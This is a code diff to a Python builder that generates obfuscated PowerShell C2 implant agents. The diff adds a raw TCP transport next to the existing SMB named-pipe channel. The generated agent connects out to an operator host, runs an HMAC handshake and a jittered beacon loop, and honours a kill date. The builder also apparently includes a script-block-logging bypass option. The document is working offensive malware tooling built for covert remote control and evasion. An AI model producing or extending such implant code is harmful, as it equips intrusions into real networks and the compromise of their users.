@@ -199,7 +199,8 @@ function {v['fn_read']}(${{pipe}}){{
 
 def _agent_core(v: dict, pipe_host: str, pipe_name: str,
                 psk_b64: str, sleep_sec: int, jitter_pct: int,
-                kill_date: str, agent_id: str = "") -> str:
+                kill_date: str, agent_id: str = "",
+                transport: str = "pipe", tcp_port: int = 0) -> str:
     """Main agent logic — connect, handshake, beacon loop."""
 
     kill_check = ""
@@ -208,15 +209,24 @@ def _agent_core(v: dict, pipe_host: str, pipe_name: str,
 if([DateTime]::UtcNow -gt [DateTime]::Parse("{kill_date}")){{return}}
 """
 
-    return f"""\
-# ── Agent ──
-{kill_check}${v['psk']}=[Convert]::FromBase64String("{psk_b64}")
-${v['ph']}="{pipe_host}"
-${v['pn']}="{pipe_name}"
-${v['sl']}={sleep_sec}
-${v['jt']}={jitter_pct}
-
-# Connect
+    if transport == "tcp":
+        connect_block = f"""\
+# Connect (TCP)
+${v['pipe']}=$null
+for(${v['retry']}=0;${v['retry']}-lt 5;${v['retry']}++){{
+  try{{
+    ${v['tcp']}=[System.Net.Sockets.TcpClient]::new(${v['ph']},{tcp_port})
+    ${v['pipe']}=${v['tcp']}.GetStream()
+    break
+  }}catch{{
+    Start-Sleep -Seconds 2
+    ${v['pipe']}=$null
+  }}
+}}
+if(-not ${v['pipe']}){{return}}"""
+    else:
+        connect_block = f"""\
+# Connect (SMB pipe)
 ${v['pipe']}=$null
 for(${v['retry']}=0;${v['retry']}-lt 5;${v['retry']}++){{
   try{{
@@ -228,7 +238,17 @@ for(${v['retry']}=0;${v['retry']}-lt 5;${v['retry']}++){{
     ${v['pipe']}=$null
   }}
 }}
-if(-not ${v['pipe']}){{return}}
+if(-not ${v['pipe']}){{return}}"""
+
+    core = f"""\
+# ── Agent ──
+{kill_check}${v['psk']}=[Convert]::FromBase64String("{psk_b64}")
+${v['ph']}="{pipe_host}"
+${v['pn']}="{pipe_name}"
+${v['sl']}={sleep_sec}
+${v['jt']}={jitter_pct}
+
+{connect_block}
 
 # Handshake — [PS 0x01 0x00] [32B nonce] [32B HMAC(nonce,PSK)]
 ${v['nonce']}=[byte[]]::new(32)
@@ -311,8 +331,12 @@ while($true){{
     break
   }}
 }}
-${v['pipe']}.Close()
+try{{${v['pipe']}.Close()}}catch{{}}
 """
+    if transport == "tcp":
+        # Also close the TcpClient
+        core += f"try{{${v['tcp']}.Close()}}catch{{}}\n"
+    return core
 
 
 # ─── Main build function ───
@@ -329,10 +353,13 @@ def build_powershell_agent(
     no_sbl: bool = False,
     debug: bool = False,
     output_path: Path = None,
+    transport: str = "pipe",
+    tcp_port: int = 0,
 ) -> tuple[Path, bytes]:
     """
-    Generate an obfuscated PowerShell SMB pipe agent.
+    Generate an obfuscated PowerShell agent.
 
+    transport: "pipe" for SMB named pipe, "tcp" for raw TCP.
     Returns (output_path, psk_bytes).
     """
     if psk is None:
@@ -353,7 +380,7 @@ def build_powershell_agent(
         # SBL
         's1', 's2', 's3', 's4', 's5',
         # Agent
-        'psk', 'ph', 'pn', 'sl', 'jt', 'pipe', 'retry',
+        'psk', 'ph', 'pn', 'sl', 'jt', 'pipe', 'tcp', 'retry',
         'nonce', 'hm', 'mac', 'hs', 'sr', 'sn',
         'sha', 'km', 'sk',
         'ci', 'enc', 'raw', 'dec', 'msg',
@@ -392,7 +419,8 @@ def build_powershell_agent(
     parts.append(_crypto_functions(v))
     parts.append(_pipe_io(v))
     parts.append(_agent_core(v, pipe_host, pipe_name, psk_b64,
-                              sleep_sec, jitter_pct, kill_date, agent_id))
+                              sleep_sec, jitter_pct, kill_date, agent_id,
+                              transport=transport, tcp_port=tcp_port))
 
     script = '\n'.join(parts)
 
@@ -412,9 +440,13 @@ def build_powershell_agent(
 # ─── Standalone CLI ───
 
 def parse_args():
-    p = argparse.ArgumentParser(description='Generate PowerShell SMB pipe agent')
-    p.add_argument('--pipe-host', required=True, help='SMB server host')
-    p.add_argument('--pipe-name', required=True, help='Named pipe name')
+    p = argparse.ArgumentParser(description='Generate PowerShell agent')
+    p.add_argument('--pipe-host', required=True, help='C2 host (SMB or TCP)')
+    p.add_argument('--pipe-name', default='TSVCPIPE-default', help='Named pipe name (pipe transport)')
+    p.add_argument('--transport', choices=['pipe', 'tcp'], default='pipe',
+                   help='Transport: pipe (SMB named pipe) or tcp (raw TCP)')
+    p.add_argument('--tcp-port', type=int, default=0,
+                   help='TCP port for raw TCP transport')
     p.add_argument('--sleep', type=int, default=60, help='Beacon interval (s)')
     p.add_argument('--jitter', type=int, default=25, help='Jitter %%')
     p.add_argument('--kill-date', default='', help='YYYY-MM-DD kill date')
@@ -428,6 +460,9 @@ def parse_args():
 
 def main():
     args = parse_args()
+    if args.transport == "tcp" and not args.tcp_port:
+        print("[!] --tcp-port is required when --transport tcp")
+        sys.exit(1)
     out, psk = build_powershell_agent(
         pipe_host=args.pipe_host,
         pipe_name=args.pipe_name,
@@ -439,8 +474,12 @@ def main():
         no_sbl=args.no_sbl,
         debug=args.debug,
         output_path=Path(args.output),
+        transport=args.transport,
+        tcp_port=args.tcp_port,
     )
-    print(f"[+] PowerShell agent: {out}")
+    transport_info = f"tcp:{args.tcp_port}" if args.transport == "tcp" else f"pipe:{args.pipe_name}"
+    print(f"[+] PowerShell agent: {out} ({args.transport})")
+    print(f"[+] Transport:        {transport_info}")
     print(f"[+] PSK saved:        {out.with_suffix('.key')}")
     print(f"[+] PSK (b64):        {base64.b64encode(psk).decode()}")
 
